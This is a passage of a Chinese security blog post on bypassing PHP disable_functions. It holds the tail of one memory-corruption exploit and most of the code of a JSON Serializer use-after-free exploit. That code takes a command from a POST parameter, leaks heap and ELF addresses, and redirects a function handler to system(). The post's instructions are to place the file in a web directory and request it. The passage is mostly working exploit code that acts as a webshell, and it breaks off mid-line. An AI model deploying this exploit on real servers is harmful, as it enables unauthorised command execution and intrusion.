class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Áõ¥Êé•Âú®webÁõÆÂΩïÂàõÂª∫‰∏™phpÊñá‰ª∂Êää‰ª£Á†ÅÂ§çÂà∂ËøõÂéªÔºåÁÑ∂ÂêéËÆøÈóÆÂç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703468.png" alt="image-20231206170304377"></p><h2 id="Âà©Áî®-Json-Serializer-UAF"><a href="#Âà©Áî®-Json-Serializer-UAF" class="headerlink" title="Âà©Áî® Json Serializer UAF"></a>Âà©Áî® Json Serializer UAF</h2><p>Âà©Áî®jsonÂ∫èÂàóÂåñ‰∏≠ÁöÑÂ†ÜÊ∫¢Âá∫Ëß¶ÂèëÔºåÂÄü‰ª•ÁªïËøádisable_function</p><h3 id="Âà©Áî®Êù°‰ª∂-9"><a href="#Âà©Áî®Êù°‰ª∂-9" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h3 id="Âà©Áî®ÊñπÊ≥ï-4"><a href="#Âà©Áî®ÊñπÊ≥ï-4" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p><a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">exp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$cmd = &quot;id&quot;;</span></span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[cmd];</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span 